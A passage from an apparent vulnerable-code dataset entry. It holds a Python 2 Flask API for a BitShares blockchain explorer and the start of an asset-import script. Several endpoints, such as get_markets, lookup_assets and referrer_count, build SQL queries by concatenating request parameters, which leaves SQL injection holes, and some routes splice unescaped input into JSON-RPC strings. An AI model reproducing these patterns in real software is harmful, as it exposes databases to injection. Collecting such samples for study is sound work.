ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+asset_api+',\"get_asset_holders\",[\"'+asset_id+'\", 0, 20]]}')\n    result =  ws.recv()\n\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_workers')\ndef get_workers():\n    ws.send('{\"jsonrpc\": \"2.0\", \"method\": \"get_worker_count\", \"params\": [], \"id\": 1}')\n\n    count =  ws.recv()\n    count_j = json.loads(count)\n\n    workers_count = int(count_j[\"result\"])\n\n    #print workers_count\n\n    # get the votes of woirker 114.0 - refund 400k\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.14.0\"]]]}')\n    result_0 = ws.recv()\n    j_0 = json.loads(result_0)\n    #account_id = j[\"result\"][0][\"worker_account\"]\n    thereshold =  int(j_0[\"result\"][0][\"total_votes_for\"])\n\n    workers = []\n    for w in range(0, workers_count):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.14.'+str(w)+'\"]]]}')\n        result =  ws.recv()\n\n        j = json.loads(result)\n        account_id = j[\"result\"][0][\"worker_account\"]\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n        result2 = ws.recv()\n        j2 = json.loads(result2)\n\n        account_name = j2[\"result\"][0][\"name\"]\n        j[\"result\"][0][\"worker_account_name\"] = account_name\n\n        current_votes = int(j[\"result\"][0][\"total_votes_for\"])\n        perc = (current_votes*100)/thereshold\n        j[\"result\"][0][\"perc\"] = perc\n\n        workers.append(j[\"result\"])\n\n    r_workers = workers[::-1]\n    return jsonify(filter(None, r_workers))\n\n\ndef isObject(string):\n    parts = string.split(\".\")\n    if len(parts) == 3:\n        return True\n    else:\n        return False\n\n\n@app.route('/get_markets')\ndef get_markets():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM markets WHERE aid='\"+asset_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/get_most_active_markets')\ndef get_most_active_markets():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM markets WHERE volume>0 ORDER BY volume DESC LIMIT 100\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/get_order_book')\ndef get_order_book():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_order_book\",[\"'+base+'\", \"'+quote+'\", 50]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_margin_positions')\ndef get_open_orders():\n    account_id = request.args.get('account_id')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_margin_positions\",[\"'+account_id+'\"]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_witnesses')\ndef get_witnesses():\n    ws.send('{\"jsonrpc\": \"2.0\", \"method\": \"get_witness_count\", \"params\": [], \"id\": 1}')\n    count =  ws.recv()\n    count_j = json.loads(count)\n    witnesses_count = int(count_j[\"result\"])\n\n    witnesses = []\n    for w in range(0, witnesses_count):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.6.'+str(w)+'\"]]]}')\n        result =  ws.recv()\n\n        j = json.loads(result)\n        if j[\"result\"][0]:\n            account_id = j[\"result\"][0][\"witness_account\"]\n            #print account_id\n            ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n            result2 = ws.recv()\n            j2 = json.loads(result2)\n\n            account_name = j2[\"result\"][0][\"name\"]\n            j[\"result\"][0][\"witness_account_name\"] = account_name\n        else:\n            #j[\"result\"][0][\"witness_account_name\"] = \"\"\n            continue\n\n        witnesses.append(j[\"result\"])\n\n\n    witnesses = sorted(witnesses, key=lambda k: int(k[0]['total_votes']))\n    r_witnesses = witnesses[::-1]\n\n    return jsonify(filter(None, r_witnesses))\n\n\n@app.route('/get_committee_members')\ndef get_committee_members():\n    ws.send('{\"jsonrpc\": \"2.0\", \"method\": \"get_committee_count\", \"params\": [], \"id\": 1}')\n    count =  ws.recv()\n    count_j = json.loads(count)\n    committee_count = int(count_j[\"result\"])\n\n    committee_members = []\n    for w in range(0, committee_count):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.5.'+str(w)+'\"]]]}')\n        result =  ws.recv()\n\n        j = json.loads(result)\n        if j[\"result\"][0]:\n            account_id = j[\"result\"][0][\"committee_member_account\"]\n            #print account_id\n            ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n            result2 = ws.recv()\n            j2 = json.loads(result2)\n\n            account_name = j2[\"result\"][0][\"name\"]\n            j[\"result\"][0][\"committee_member_account_name\"] = account_name\n        else:\n            #j[\"result\"][0][\"witness_account_name\"] = \"\"\n            continue\n\n        committee_members.append(j[\"result\"])\n\n    committee_members = sorted(committee_members, key=lambda k: int(k[0]['total_votes']))\n    r_committee = committee_members[::-1] # this reverses array\n\n    return jsonify(filter(None, r_committee))\n\n\n@app.route('/market_chart_dates')\ndef market_chart_dates():\n    base = datetime.date.today()\n    date_list = [base - datetime.timedelta(days=x) for x in range(0, 100)]\n    date_list = [d.strftime(\"%Y-%m-%d\") for d in date_list]\n    #print len(list(reversed(date_list)))\n    return jsonify(list(reversed(date_list)))\n\n\n@app.route('/market_chart_data')\ndef market_chart_data():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + base + '\"], 0]]}')\n    result_l = ws.recv()\n    j_l = json.loads(result_l)\n    base_id = j_l[\"result\"][0][\"id\"]\n    base_precision = 10**j_l[\"result\"][0][\"precision\"]\n    #print base_id\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + quote + '\"], 0]]}')\n    result_l = ws.recv()\n    j_l = json.loads(result_l)\n    #print j_l\n    quote_id = j_l[\"result\"][0][\"id\"]\n    quote_precision = 10**j_l[\"result\"][0][\"precision\"]\n    #print quote_id\n\n    now = datetime.date.today()\n    ago = now - datetime.timedelta(days=100)\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+history_api+',\"get_market_history\", [\"'+base_id+'\", \"'+quote_id+'\", 86400, \"'+ago.strftime(\"%Y-%m-%dT%H:%M:%S\")+'\", \"'+now.strftime(\"%Y-%m-%dT%H:%M:%S\")+'\"]]}')\n    result_l = ws.recv()\n    j_l = json.loads(result_l)\n\n    data = []\n    for w in range(0, len(j_l[\"result\"])):\n\n        open_quote = float(j_l[\"result\"][w][\"open_quote\"])\n        high_quote = float(j_l[\"result\"][w][\"high_quote\"])\n        low_quote = float(j_l[\"result\"][w][\"low_quote\"])\n        close_quote = float(j_l[\"result\"][w][\"close_quote\"])\n\n        open_base = float(j_l[\"result\"][w][\"open_base\"])\n        high_base = float(j_l[\"result\"][w][\"high_base\"])\n        low_base = float(j_l[\"result\"][w][\"low_base\"])\n        close_base = float(j_l[\"result\"][w][\"close_base\"])\n\n        open = 1/(float(open_base/base_precision)/float(open_quote/quote_precision))\n        high = 1/(float(high_base/base_precision)/float(high_quote/quote_precision))\n        low = 1/(float(low_base/base_precision)/float(low_quote/quote_precision))\n        close = 1/(float(close_base/base_precision)/float(close_quote/quote_precision))\n\n        ohlc = [open, close, low, high]\n\n        data.append(ohlc)\n\n    append = [0,0,0,0]\n    if len(data) < 99:\n        complete = 99 - len(data)\n        for c in range(0, complete):\n            data.insert(0, append)\n\n    return jsonify(data)\n\n\ndef findMax(a,b):\n    if a != 'Inf' and b != 'Inf':\n        return max([a, b])\n    elif a == 'Inf':\n        return b\n    else:\n        return a\n\n\ndef findMin(a, b):\n    if a != 0 and b != 0:\n        return min([a, b])\n    elif a == 0:\n        return b\n    else:\n        return a\n\n\n@app.route('/top_proxies')\ndef top_proxies():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT sum(amount) FROM holders\"\n    cur.execute(query)\n    total = cur.fetchone()\n    total_votes = total[0]\n\n    query = \"SELECT voting_as FROM holders WHERE voting_as<>'1.2.5' group by voting_as\"\n    cur.execute(query)\n    results = cur.fetchall()\n    #con.close()\n\n    proxies = []\n\n    for p in range(0, len(results)):\n\n        proxy_line = [0] * 5\n\n        proxy_id = results[p][0]\n        proxy_line[0] = proxy_id\n\n        query = \"SELECT account_name, amount FROM holders WHERE account_id='\"+proxy_id+\"' LIMIT 1\"\n        cur.execute(query)\n        proxy = cur.fetchone()\n\n        try:\n            proxy_name = proxy[0]\n            proxy_amount = proxy[1]\n        except:\n            proxy_name = \"unknown\"\n            proxy_amount = 0\n\n\n        proxy_line[1] = proxy_name\n\n        query = \"SELECT amount, account_id FROM holders WHERE voting_as='\"+proxy_id+\"'\"\n        cur.execute(query)\n        results2 = cur.fetchall()\n\n        proxy_line[2] = int(proxy_amount)\n\n        for p2 in range(0, len(results2)):\n            amount = results2[p2][0]\n            account_id = results2[p2][1]\n            proxy_line[2] = proxy_line[2] + int(amount)  # total proxy votes\n            proxy_line[3] = proxy_line[3] + 1       # followers\n\n        if proxy_line[3] > 2:\n            percentage = float(float(proxy_line[2]) * 100.0/ float(total_votes))\n            proxy_line[4] = percentage\n            proxies.append(proxy_line)\n\n    con.close()\n\n    proxies = sorted(proxies, key=lambda k: int(k[2]))\n    r_proxies = proxies[::-1]\n\n    return jsonify(filter(None, r_proxies))\n\n\n@app.route('/top_holders')\ndef top_holders():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM holders WHERE voting_as='1.2.5' ORDER BY amount DESC LIMIT 10\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/witnesses_votes')\ndef witnesses_votes():\n    proxies = top_proxies()\n    proxies = proxies.response\n    proxies = ''.join(proxies)\n    proxies = json.loads(proxies)\n    proxies = proxies[:10]\n\n    witnesses = get_witnesses()\n    witnesses = witnesses.response\n    witnesses = ''.join(witnesses)\n    witnesses = json.loads(witnesses)\n    witnesses = witnesses[:25]\n\n    w, h = len(proxies) + 2, len(witnesses)\n    witnesses_votes = [[0 for x in range(w)] for y in range(h)]\n\n    for w in range(0, len(witnesses)):\n        vote_id =  witnesses[w][0][\"vote_id\"]\n        id_witness = witnesses[w][0][\"id\"]\n        witness_account_name = witnesses[w][0][\"witness_account_name\"]\n\n        witnesses_votes[w][0] = witness_account_name\n        witnesses_votes[w][1] = id_witness\n\n        c = 2\n\n        for p in range(0, len(proxies)):\n            id_proxy = proxies[p][0]\n\n            #witnesses_votes[w][c] = id_proxy\n\n            ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+id_proxy+'\"]]]}')\n            result = ws.recv()\n            j = json.loads(result)\n\n            votes = j[\"result\"][0][\"options\"][\"votes\"]\n            #print votes\n            p_vote = \"-\"\n            for v in range(0, len(votes)):\n\n                if votes[v] == vote_id:\n                    p_vote = \"Y\"\n\n            witnesses_votes[w][c] = id_proxy + \":\" + p_vote\n\n            c = c + 1\n\n    #print witnesses_votes\n    return jsonify(witnesses_votes)\n\n\n@app.route('/workers_votes')\ndef workers_votes():\n    proxies = top_proxies()\n    proxies = proxies.response\n    proxies = ''.join(proxies)\n    proxies = json.loads(proxies)\n    proxies = proxies[:10]\n\n    workers = get_workers()\n    workers = workers.response\n    workers = ''.join(workers)\n    workers = json.loads(workers)\n    workers = workers[:10]\n    #print workers\n\n    w, h = len(proxies) + 2, len(workers)\n    workers_votes = [[0 for x in range(w)] for y in range(h)]\n\n    for w in range(0, len(workers)):\n        vote_id =  workers[w][0][\"vote_for\"]\n        id_worker = workers[w][0][\"id\"]\n        worker_account_name = workers[w][0][\"worker_account_name\"]\n\n        workers_votes[w][0] = worker_account_name\n        workers_votes[w][1] = id_worker\n\n        c = 2\n\n        for p in range(0, len(proxies)):\n            id_proxy = proxies[p][0]\n\n            #witnesses_votes[w][c] = id_proxy\n\n            ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+id_proxy+'\"]]]}')\n            result = ws.recv()\n            j = json.loads(result)\n\n            votes = j[\"result\"][0][\"options\"][\"votes\"]\n            #print votes\n            p_vote = \"-\"\n            for v in range(0, len(votes)):\n\n                if votes[v] == vote_id:\n                    p_vote = \"Y\"\n\n            workers_votes[w][c] = id_proxy + \":\" + p_vote\n\n            c = c + 1\n\n    #print witnesses_votes\n    return jsonify(workers_votes)\n\n\n@app.route('/committee_votes')\ndef committee_votes():\n    proxies = top_proxies()\n    proxies = proxies.response\n    proxies = ''.join(proxies)\n    proxies = json.loads(proxies)\n    proxies = proxies[:10]\n\n    committee = get_committee_members()\n    committee = committee.response\n    committee = ''.join(committee)\n    committee = json.loads(committee)\n    committee = committee[:11]\n    #print workers\n\n    w, h = len(proxies) + 2, len(committee)\n    committee_votes = [[0 for x in range(w)] for y in range(h)]\n\n    for w in range(0, len(committee)):\n        vote_id =  committee[w][0][\"vote_id\"]\n        id_committee = committee[w][0][\"id\"]\n        committee_account_name = committee[w][0][\"committee_member_account_name\"]\n\n        committee_votes[w][0] = committee_account_name\n        committee_votes[w][1] = id_committee\n\n        c = 2\n\n        for p in range(0, len(proxies)):\n            id_proxy = proxies[p][0]\n\n            #witnesses_votes[w][c] = id_proxy\n\n            ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+id_proxy+'\"]]]}')\n            result = ws.recv()\n            j = json.loads(result)\n\n            votes = j[\"result\"][0][\"options\"][\"votes\"]\n            #print votes\n            p_vote = \"-\"\n            for v in range(0, len(votes)):\n\n                if votes[v] == vote_id:\n                    p_vote = \"Y\"\n                    committee_votes[w][c] = id_proxy + \":\" + p_vote\n                    break\n                else:\n                    p_vote = \"-\"\n                    committee_votes[w][c] = id_proxy + \":\" + p_vote\n\n            c = c + 1\n\n    #print witnesses_votes\n    return jsonify(committee_votes)\n\n\n@app.route('/top_markets')\ndef top_markets():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume FROM markets ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n    total = 0\n    for v in range(0, len(results)):\n        total = total + results[v][0]\n\n    query = \"SELECT pair, volume FROM markets ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    w = 2\n    h = len(results)\n    top_markets = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_markets[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_markets[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_markets)\n\n\n@app.route('/top_smartcoins')\ndef top_smartcoins():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume FROM assets WHERE type='SmartCoin' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n    total = 0\n    for v in range(0, len(results)):\n        total = total + results[v][0]\n\n    query = \"SELECT aname, volume FROM assets WHERE type='SmartCoin' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    w = 2\n    h = len(results)\n    top_smartcoins = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_smartcoins[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_smartcoins[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_smartcoins)\n\n\n@app.route('/top_uias')\ndef top_uias():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume FROM assets WHERE type='User Issued' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n    total = 0\n    for v in range(0, len(results)):\n        total = total + results[v][0]\n\n    query = \"SELECT aname, volume FROM assets WHERE TYPE='User Issued' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    w = 2\n    h = len(results)\n    top_uias = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_uias[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_uias[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_uias)\n\n\n@app.route('/top_operations')\ndef top_operations():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT count(*) FROM ops\"\n    cur.execute(query)\n    results = cur.fetchone()\n    total = results[0]\n\n    query = \"SELECT op_type, count(op_type) AS counter FROM ops GROUP BY op_type ORDER BY counter DESC\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n\n    w = 2\n    h = len(results)\n    top_operations = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_operations[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_operations[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_operations)\n\n\n@app.route('/last_network_transactions')\ndef last_network_transactions():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM ops ORDER BY block_num DESC LIMIT 20\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    #print results\n    return jsonify(results)\n\n\n@app.route('/lookup_accounts')\ndef lookup_accounts():\n    start = request.args.get('start')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_accounts\",[\"'+start+'\", 1000]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/lookup_assets')\ndef lookup_assets():\n    start = request.args.get('start')\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT aname FROM assets WHERE aname LIKE '\"+start+\"%'\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/getlastblocknumbher')\ndef getlastblocknumber():\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"][\"head_block_number\"])\n\n\n@app.route('/account_history_pager')\ndef account_history_pager():\n    page = request.args.get('page')\n    account_id = request.args.get('account_id')\n\n    # connecting into a full node.\n    #full_websocket_url = \"ws://node.testnet.bitshares.eu:18092/ws\"\n    full_ws = create_connection(config.FULL_WEBSOCKET_URL)\n\n    full_ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  full_ws.recv()\n\n    full_ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  full_ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n\n    if not isObject(account_id):\n        full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = full_ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    # need to get total ops for account\n    full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n    result_a = full_ws.recv()\n    j_a = json.loads(result_a)\n\n    stats = j_a[\"result\"][0][\"statistics\"]\n\n    full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+stats+'\"]]]}')\n    result_s =  full_ws.recv()\n    j_s = json.loads(result_s)\n\n    total_ops = j_s[\"result\"][0][\"total_ops\"]\n    #print total_ops\n    start = total_ops - (20 * int(page))\n    stop = total_ops - (40 * int(page))\n\n    if stop < 0:\n        stop = 0\n\n    if start > 0:\n        full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+history_api+',\"get_relative_account_history\",[\"'+account_id+'\", '+str(stop)+', 20, '+str(start)+']]}')\n        result_f =  full_ws.recv()\n        j_f = json.loads(result_f)\n\n        for c in range(0, len(j_f[\"result\"])):\n            full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block_header\",[' + str(j_f[\"result\"][c][\"block_num\"]) + ', 0]]}')\n            result2 = full_ws.recv()\n            j2 = json.loads(result2)\n            j_f[\"result\"][c][\"timestamp\"] = j2[\"result\"][\"timestamp\"]\n            j_f[\"result\"][c][\"witness\"] = j2[\"result\"][\"witness\"]\n\n        return jsonify(j_f[\"result\"])\n    else:\n        return \"\"\n\n\n@app.route('/get_limit_orders')\ndef get_limit_orders():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_limit_orders\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_call_orders')\ndef get_call_orders():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_call_orders\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_settle_orders')\ndef get_settle_orders():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_settle_orders\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_fill_order_history')\ndef get_fill_order_history():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[' + history_api + ',\"get_fill_order_history\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_dex_total_volume')\ndef get_dex_total_volume():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select price from assets where aname='USD'\"\n    cur.execute(query)\n    results = cur.fetchone()\n    usd_price = results[0]\n\n    query = \"select price from assets where aname='CNY'\"\n    cur.execute(query)\n    results = cur.fetchone()\n    cny_price = results[0]\n\n    query = \"select sum(volume) from assets WHERE aname!='BTS'\"\n    cur.execute(query)\n    results = cur.fetchone()\n    volume = results[0]\n\n    query = \"select sum(mcap) from assets\"\n    cur.execute(query)\n    results = cur.fetchone()\n    market_cap = results[0]\n    con.close()\n\n    res = {\"volume_bts\": round(volume), \"volume_usd\": round(volume/usd_price), \"volume_cny\": round(volume/cny_price),\n           \"market_cap_bts\": round(market_cap), \"market_cap_usd\": round(market_cap/usd_price), \"market_cap_cny\": round(market_cap/cny_price)}\n\n    return jsonify(res)\n\n\n@app.route('/daily_volume_dex_dates')\ndef daily_volume_dex_dates():\n    base = datetime.date.today()\n    date_list = [base - datetime.timedelta(days=x) for x in range(0, 60)]\n    date_list = [d.strftime(\"%Y-%m-%d\") for d in date_list]\n    #print len(list(reversed(date_list)))\n    return jsonify(list(reversed(date_list)))\n\n\n@app.route('/daily_volume_dex_data')\ndef daily_volume_dex_data():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select value from stats where type='volume_bts' order by date desc limit 60\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    mod = [0 for x in range(len(results))]\n    for r in range(0, len(results)):\n        mod[r] = results[r][0]\n\n    return jsonify(list(reversed(mod)))\n\n\n@app.route('/get_all_asset_holders')\ndef get_all_asset_holders():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    all = []\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[' + asset_api + ',\"get_asset_holders\",[\"' + asset_id + '\", 0, 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    for r in range(0, len(j[\"result\"])):\n        all.append(j[\"result\"][r])\n\n    len_result = len(j[\"result\"])\n    start = 100\n    while  len_result == 100:\n        start = start + 100\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[' + asset_api + ',\"get_asset_holders\",[\"' + asset_id + '\", ' + str(start) + ', 100]]}')\n        result = ws.recv()\n        j = json.loads(result)\n        len_result = len(j[\"result\"])\n        for r in range(0, len(j[\"result\"])):\n            all.append(j[\"result\"][r])\n\n\n    return jsonify(all)\n\n\n@app.route('/referrer_count')\ndef referrer_count():\n    account_id = request.args.get('account_id')\n\n    if not isObject(account_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select count(*) from referrers where referrer='\"+account_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchone()\n\n    return jsonify(results)\n\n\n@app.route('/get_all_referrers')\ndef get_all_referrers():\n    account_id = request.args.get('account_id')\n\n    if not isObject(account_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select * from referrers where referrer='\"+account_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    return jsonify(results)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bitshares/bitshares-explorer-api/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_assets.py",
        "source": "#!/usr/bin/env python2\nimport json\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport api\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\nquery = \"TRUNCATE assets\"\ncur.execute(query)\n\nquery = \"ALTER SEQUENCE assets_id_seq RESTART WITH 1;\"\ncur.execute(query)\n\n# alter sequence of the ops once a day here\nquery = \"DELETE FROM ops WHERE oid NOT IN (SELECT oid FROM ops ORDER BY oid DESC LIMIT 10);\"\ncur.execute(query)\n\nfor x in range(0, 10):\n    query = \"UPDATE ops set oid=\"+str(x+1)+\" WHERE oid IN (SELECT oid FROM ops ORDER BY oid LIMIT 1 OFFSET \"+str(x)+\");\"\n    #print query\n    cur.execute(query)\n\nquery = \"ALTER SEQUENCE ops_oid_seq RESTART WITH 11;\"\ncur.execute(query)\n\ncon.commit()\n\nall_assets = []\n\nws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"AAAAA\", 100]]}')\nresult = ws.recv()\nj = json.loads(result)\n\nall_assets.append(j);\n\nlen_result = len(j[\"result\"])\n\nprint len_result\n#print all_assets\n\nwhile len_result == 100:\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"'+j[\"result\"][99][\"symbol\"]+'\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    len_result = len(j[\"result\"])\n    all_assets.append(j);\n\nfor x in range(0, len(all_assets)):\n    size = len(all_assets[x][\"result\"])\n    print size\n\n    for i in 